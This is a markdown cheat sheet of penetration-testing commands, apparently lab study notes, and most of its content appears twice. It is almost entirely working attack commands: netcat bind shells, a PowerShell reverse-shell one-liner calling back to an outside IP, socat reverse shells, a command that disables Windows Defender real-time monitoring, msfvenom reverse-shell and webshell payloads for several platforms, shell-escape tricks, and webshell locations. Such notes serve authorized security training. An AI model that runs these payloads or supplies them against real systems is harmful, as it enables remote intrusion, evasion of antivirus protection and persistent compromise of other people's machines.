# Shells and payloads

**Discover environmental variables of a system to identify the shell language**

```shell
env
```

#### Start netcat listener on a specified port

```bash
sudo nc -lvnp <port #>
```

#### Connect to a netcat listener

```bash
nc -nv <ip_address> <port>
```

#### Bind shell using netcat

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### PowerShell Reverse Shell

```powershell
### PowerShell one-liner used to connect back to a listener
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Reverse Shell Upgrades

#### Python Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Full TTY Upgrade

```bash
stty raw -echo; fg
reset
xterm
```

#### Socat Reverse Shell

```bash
socat TCP:10.10.14.113:443 EXEC:/bin/bash
```

#### Socat Listener

```bash
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
```

#### Disable Windows Defender Real-Time Monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Payload Generation with MSFvenom

#### Linux Reverse Shell Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf
```

#### Windows Reverse Shell Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
```

#### MacOS Reverse Shell Payload

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho
```

#### ASP Web Shell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp
```

#### JSP Web Shell Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp
```

#### WAR Web Shell Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```

#### Shell Spawning Techniques

#### Python Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

#### Basic Linux Shell

```bash
/bin/sh -i
```

#### Perl Interactive Shell

```bash
perl -e 'exec "/bin/sh";'
```

#### Ruby Interactive Shell

```ruby
exec "/bin/sh"
```

#### Lua Interactive Shell

```lua
os.execute('/bin/sh')
```

#### Awk Shell

```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### Find Command for Shell Spawning

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}\;'
find . -exec /bin/sh \; -quit
```

#### Vim Shell Escape

```bash
vim -c ':!/bin/sh'
```

#### Start netcat listener on a specified port

```bash
sudo nc -lvnp <port #>
```

#### Connect to a netcat listener

```bash
nc -nv <ip_address> <port>
```

#### Bind shell using netcat

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### PowerShell Reverse Shell

```powershell
### PowerShell one-liner used to connect back to a listener
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Reverse Shell Upgrades

#### Python Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Full TTY Upgrade

```bash
stty raw -echo; fg
reset
xterm
```

#### Socat Reverse Shell

```bash
socat TCP:10.10.14.113:443 EXEC:/bin/bash
```

#### Socat Listener

```bash
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
```

#### Disable Windows Defender Real-Time Monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Payload Generation with MSFvenom

#### Linux Reverse Shell Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf
```

#### Windows Reverse Shell Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
```

#### MacOS Reverse Shell Payload

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho
```

#### ASP Web Shell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp
```

#### JSP Web Shell Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp
```

#### WAR Web Shell Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```

#### Shell Spawning Techniques

#### Python Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

#### Basic Linux Shell

```bash
/bin/sh -i
```

#### Perl Interactive Shell

```bash
perl -e 'exec "/bin/sh";'
```

#### Ruby Interactive Shell

```ruby
exec "/bin/sh"
```

#### Lua Interactive Shell

```lua
os.execute('/bin/sh')
```

#### Awk Shell

```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### Find Command for Shell Spawning

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}\;'
find . -exec /bin/sh \; -quit
```

#### Vim Shell Escape

```bash
vim -c ':!/bin/sh'
```

#### Web Shell Locations

#### Laudanum Webshells on ParrotOS and Pwnbox

```bash
/usr/share/webshells/laudanum
```

#### Antak Webshell on ParrotOS and Pwnbox

```bash
/usr/share/nishang/Antak-WebShell
```
